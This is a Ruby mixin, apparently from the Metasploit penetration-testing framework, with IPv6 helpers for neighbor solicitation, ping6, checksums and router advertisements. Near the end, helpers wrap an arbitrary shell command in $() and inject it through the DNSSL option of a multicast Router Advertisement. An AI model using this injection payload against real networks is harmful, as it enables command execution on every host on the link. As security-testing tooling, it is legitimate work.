# -*- coding: binary -*-

module Msf

###
#
# This module provides common tools for IPv6
#
###
module Exploit::Remote::Ipv6

  #
  # Initializes an instance of an exploit module that captures traffic
  #
  def initialize(info = {})
    super
    register_options(
      [
        OptString.new('INTERFACE', [false, 'The name of the interface']),
        OptString.new("SMAC", [ false, "The source MAC address"]),
        OptAddress.new("SHOST", [ false, "The source IPv6 address" ] ),
        OptInt.new("TIMEOUT", [ true, "Timeout when waiting for host response.", 5])
      ], Msf::Exploit::Remote::Ipv6
    )

    begin
      require 'pcaprub'
      @pcaprub_loaded = true
    rescue ::Exception => e
      @pcaprub_loaded = false
      @pcaprub_error  = e
    end
  end


  #
  # Shortcut method for resolving our local interface name
  #
  def ipv6_interface(opts={})
    opts['INTERFACE'] || datastore['INTERFACE'] || ::Pcap.lookupdev
  end

  #
  # Shortcut method for determining our link-local address
  #
  def ipv6_link_address(opts={})
    Rex::Socket.ipv6_link_address(ipv6_interface(opts))
  end

  #
  # Shortcut method for determining our MAC address
  #
  def ipv6_mac(opts={})
    Rex::Socket.ipv6_mac(ipv6_interface(opts))
  end

  #
  # Opens a pcaprub capture interface to inject packets, and sniff ICMPv6 packets
  #

  def open_icmp_pcap(opts = {})
    check_pcaprub_loaded

    dev = ipv6_interface(opts)
    len = 65535
    tim = 0
    @ipv6_icmp6_capture = ::Pcap.open_live(dev, len, true, tim)
    @ipv6_icmp6_capture.setfilter("icmp6")
  end

  #
  # Close the capture interface
  #
  def close_icmp_pcap()
    check_pcaprub_loaded

    return if not @ipv6_icmp6_capture
    @ipv6_icmp6_capture = nil
  end

  #
  # Send out a ICMPv6 neighbor solicitation, and
  # return the associated MAC address
  #
  def solicit_ipv6_mac(dhost, opts = {})
    check_pcaprub_loaded

    dhost_intf = dhost + '%' + ipv6_interface(opts)

    smac = opts['SMAC'] || datastore['SMAC'] || ipv6_mac
    shost = opts['SHOST'] || datastore['SHOST'] || Rex::Socket.source_address(dhost_intf)
    timeout = opts['TIMEOUT'] || datastore['TIMEOUT'] || 3

    open_icmp_pcap()

    p2 = PacketFu::IPv6Packet.new
    p2.eth_saddr = smac
    p2.eth_daddr = ipv6_soll_mcast_mac(dhost)
    p2.ipv6_saddr = shost
    p2.ipv6_daddr = ipv6_soll_mcast_addr6(dhost)
    p2.ipv6_hop = 255
    p2.ipv6_next = 0x3a
    p2.payload = ipv6_neighbor_solicitation(
      IPAddr.new(dhost).to_i,
      p2.eth_src
    )
    p2.ipv6_len = p2.payload.size
    ipv6_checksum!(p2)

    @ipv6_icmp6_capture.inject(p2.to_s)

    # Wait for a response
    max_epoch = ::Time.now.to_i + timeout
    while(::Time.now.to_i < max_epoch)
      pkt_bytes = @ipv6_icmp6_capture.next()
      next if not pkt_bytes
      pkt = PacketFu::Packet.parse(pkt_bytes) rescue nil
      next unless pkt
      next unless pkt.is_ipv6?
      next unless pkt.ipv6_next == 0x3a
      next unless pkt.payload
      next if pkt.payload.empty?
      next unless pkt.payload[0,1] == "\x88" # Neighbor advertisement
      if(IPAddr.new(pkt.ipv6_daddr).to_i == IPAddr.new(shost).to_i and
         IPAddr.new(pkt.ipv6_saddr).to_i == IPAddr.new(dhost).to_i)
         ipv6opts = pkt.payload[24,pkt.payload.size]
         next unless ipv6opts
         parsed_opts = ipv6_parse_options(ipv6opts)
         parsed_opts.each do |opt|
           if opt[0] == 2
             addr = PacketFu::EthHeader.str2mac(opt.last)
             close_icmp_pcap()
             return(addr)
           end
         end
         close_icmp_pcap
         return(pkt.eth_saddr)
      end
    end
    close_icmp_pcap
    return nil
  end

  #
  # Send a ICMPv6 Echo Request, and wait for the
  # associated ICMPv6 Echo Response
  #
  def ping6(dhost, opts={})
    check_pcaprub_loaded

    dhost_intf = dhost + '%' + ipv6_interface(opts)

    smac = opts['SMAC'] || datastore['SMAC'] || ipv6_mac
    shost = opts['SHOST'] || datastore['SHOST'] || Rex::Socket.source_address(dhost_intf)
    dmac = opts['DMAC'] || solicit_ipv6_mac(dhost)
    timeout = opts['TIMEOUT'] || datastore['TIMEOUT']
    wait = opts['WAIT']


    if(wait.eql?(nil))
      wait = true
    end

    dmac.eql?(nil) and return false

    open_icmp_pcap()

    # Create ICMPv6 Request
    p = PacketFu::IPv6Packet.new
    p.eth_saddr = smac
    p.eth_daddr = dmac
    p.ipv6_saddr = shost
    p.ipv6_daddr = dhost
    p.ipv6_next = 0x3a
    icmp_id = rand(65000)
    icmp_seq = 1
    icmp_payload = Rex::Text.rand_text(8)
    p.payload = ipv6_icmpv6_echo_request(icmp_id,icmp_seq,icmp_payload)
    p.ipv6_len = p.payload.to_s.size
    ipv6_checksum!(p)

    @ipv6_icmp6_capture.inject(p.to_s)

    if(wait.eql?(true))
      print_status("Waiting for ping reply...")
      print_line("")
      # Wait for a response
      max_epoch = ::Time.now.to_i + timeout
      while(::Time.now.to_i < max_epoch)
        pkt = @ipv6_icmp6_capture.next()
        next if not pkt
        response_pkt = PacketFu::Packet.parse(pkt) rescue nil
        next unless response_pkt
        next unless response_pkt.is_ipv6?
        next unless response_pkt.payload
        next if response_pkt.payload.empty?
        next unless response_pkt.payload[0,1] == "\x81" # Echo reply
        if( response_pkt.ipv6_daddr == p.ipv6_saddr and
           response_pkt.ipv6_saddr == p.ipv6_daddr and
           response_pkt.ipv6_daddr == p.ipv6_saddr and
           response_pkt.payload[4,2] == p.payload[4,2] and # Id
           response_pkt.payload[6,2] == p.payload[6,2] # Seq
          )
          close_icmp_pcap()
          return(true)
        end

      end # End while
    end

    close_icmp_pcap()
    return(false)
  end

  #
  # Helper methods that haven't made it upstream yet. Mostly packet data
  # packers, also a checksum calculator.
  #

  def ipv6_icmpv6_echo_request(id,seq,data)
    type = 0x80
    code = 0
    checksum = 0
    id ||= rand(0x10000)
    seq ||= rand(0x10000)
    [type,code,checksum,id,seq,data].pack("CCnnna*")
  end

  # Simple tlv parser
  def ipv6_parse_options(data)
    pos = 0
    opts = []
    while pos < data.size
      type, len = data[pos,2].unpack("CC")
      this_opt = [type,len]
      this_opt << data[pos+2, (pos-2 + (len * 8))]
      opts << this_opt
      pos += this_opt.pack("CCa*").size
    end
    opts
  end

  # From Jon Hart's Racket::L3::Misc#linklocaladdr(), which
  # is from Daniele Bellucci
  def ipv6_linklocaladdr(mac)
    mac = mac.split(":")
    mac[0] = (mac[0].to_i(16) ^ (1 << 1)).to_s(16)
    ["fe80", "", mac[0,2].join, mac[2,2].join("ff:fe"), mac[4,2].join].join(":")
  end

  # From Jon Hart's Racket::L3::Misc#soll_mcast_addr6(),
  # which is from DDniele Belluci
  def ipv6_soll_mcast_addr6(addr)
    h = addr.split(':')[-2, 2]
    m = []
    x = h[0]
    x[0..1] = 'ff'
    m << x
    x = h[1]
    x.sub!(/^0*/, "")
    m << x
    'ff02::1:' + m.join(':')
  end

  # From Jon Hart's Racket::L3::Misc#soll_mcast_mac()
  def ipv6_soll_mcast_mac(addr)
    h = addr.split(':')[-2, 2]
    m = []
    m << 'ff'
    m << (h[0].to_i(16) & 0xff).to_s(16)
    m << ((h[1].to_i(16) & (0xff << 8)) >> 8).to_s(16)
    m << (h[1].to_i(16) & 0xff).to_s(16)
    '33:33:' + m.join(':')
  end

  # Usual ghetto strategy from PacketFu
  def ipv6_checksum!(pkt)
    check_data = pkt.headers.last[:ipv6_src].to_s.unpack("n8")
    check_data << pkt.headers.last[:ipv6_dst].to_s.unpack("n8")
    check_data << pkt.ipv6_len
    check_data << [0,58]
    check_payload = pkt.payload.size % 2 == 0 ? pkt.payload : pkt.payload + "\x00"
    check_data << check_payload.unpack("n*")
    check_data.flatten!
    checksum = check_data.inject(0) {|sum,x| sum += x}
    checksum = checksum % 0xffff
    checksum = 0xffff - checksum
    checksum == 0 ? 0xffff : checksum
    pkt.payload[2,2] = [checksum].pack("n")
    pkt
  end

  # Takes a neighbor and smac as arguments, The Neighbor
  # value must be an int, while the smac must be a string.
  # Very rudimentary and temporary.
  def ipv6_neighbor_solicitation(neigh,smac)
    target = neigh.to_s(16).scan(/../).map {|x| x.to_i(16)}.pack("C*")
    type = 135
    code = 0
    checksum = 0
    reserved = 0
    opt_type = 1
    opt_len = 1
    [type, code, checksum, reserved,
      target, opt_type, opt_len, smac
    ].pack("CCnNa16CCa6")
  end

  # Encode a domain name in DNS label format (length-prefixed labels, null-terminated)
  def ipv6_encode_domain(name)
    result = ''
    name.split('.').each do |label|
      next if label.empty?

      data = label.encode('ASCII-8BIT')
      result << [data.length].pack('C') << data
    end
    result << "\x00"
  end

  # Encode a command payload as DNS label format for DNSSL injection.
  # Wraps the command in $() for shell substitution and splits into
  # 63-byte chunks (max DNS label length).
  def ipv6_encode_dnssl_payload(cmd)
    payload_str = "$(#{cmd})"
    payload_bytes = payload_str.encode('ASCII-8BIT')

    if payload_bytes.length <= 63
      return [payload_bytes.length].pack('C') + payload_bytes + "\x00"
    end

    result = ''
    until payload_bytes.empty?
      chunk = payload_bytes.slice!(0, 63)
      result << [chunk.length].pack('C') << chunk
    end
    result << "\x00"
  end

  # Build DNSSL option (https://www.rfc-editor.org/rfc/rfc6106#section-5.2)
  def ipv6_build_dnssl_option(cmd, lifetime = 0xFFFFFFFF)
    data = ipv6_encode_domain("#{rand_text_alpha(6..10)}.local") + ipv6_encode_dnssl_payload(cmd)

    # Pad to 8-byte boundary (option header is 8 bytes)
    pad_len = -data.length % 8
    data << "\x00" * pad_len

    # Option header: Type(1) + Length(1) + Reserved(2) + Lifetime(4)
    # Length is in units of 8 octets, including header
    length_units = (8 + data.length) / 8

    [31, length_units, 0].pack('CCn') + [lifetime].pack('N') + data
  end

  # Build Source Link-Layer Address option (https://www.rfc-editor.org/rfc/rfc4861)
  def ipv6_build_slla_option(mac)
    mac_bytes = mac.split(':').map { |x| x.to_i(16) }.pack('C6')
    [1, 1].pack('CC') + mac_bytes
  end

  # Build Prefix Information option (RFC 4861)
  def ipv6_build_prefix_info_option
    type = 3
    length = 4 # 32 bytes / 8
    prefix_len = 64
    flags = 0xC0 # L=1, A=1 (on-link, autonomous address config)
    valid_lifetime = 30.days.to_i
    preferred_lifetime = 7.days.to_i
    reserved = 0
    prefix = IPAddr.new('2001:db8::').hton

    [type, length, prefix_len, flags].pack('CCCC') +
      [valid_lifetime, preferred_lifetime, reserved].pack('NNN') +
      prefix
  end

  # Build ICMPv6 Router Advertisement payload
  def ipv6_build_ra_payload
    type = 134 # Router Advertisement
    code = 0
    checksum = 0
    cur_hop_limit = 64
    flags = 0x40 # O flag (Other configuration)
    router_lifetime = 1800
    reachable_time = 0
    retrans_timer = 0

    [type, code, checksum, cur_hop_limit, flags, router_lifetime, reachable_time, retrans_timer].pack('CCnCCnNN')
  end

  # Build the complete Router Advertisement packet
  def ipv6_build_ra_packet(smac, payload_cmd, shost = 'fe80::1')
    # Build ICMPv6 RA with options
    ra_payload = ipv6_build_ra_payload
    ra_payload << ipv6_build_slla_option(smac)
    ra_payload << ipv6_build_prefix_info_option
    ra_payload << ipv6_build_dnssl_option(payload_cmd)

    # Build IPv6 packet
    p = PacketFu::IPv6Packet.new
    p.eth_saddr = smac
    p.eth_daddr = '33:33:00:00:00:01' # All-nodes multicast (https://datatracker.ietf.org/doc/html/rfc4861#section-4.2)
    p.ipv6_saddr = shost # Link-local address (https://datatracker.ietf.org/doc/html/rfc4291#section-2.5.6)
    p.ipv6_daddr = 'ff02::1' # All-nodes multicast address (https://datatracker.ietf.org/doc/html/rfc4291-2.5.6#section-2.7.1)
    p.ipv6_hop = 255
    p.ipv6_next = 0x3a # ICMPv6

    p.payload = ra_payload
    p.ipv6_len = ra_payload.length

    ipv6_checksum!(p)

    p
  end

  def check_pcaprub_loaded
    unless @pcaprub_loaded
      print_status("The Pcaprub module is not available: #{@pcaprub_error}")
      raise RuntimeError, "Pcaprub not available"
    else
      true
  end

end

end
end
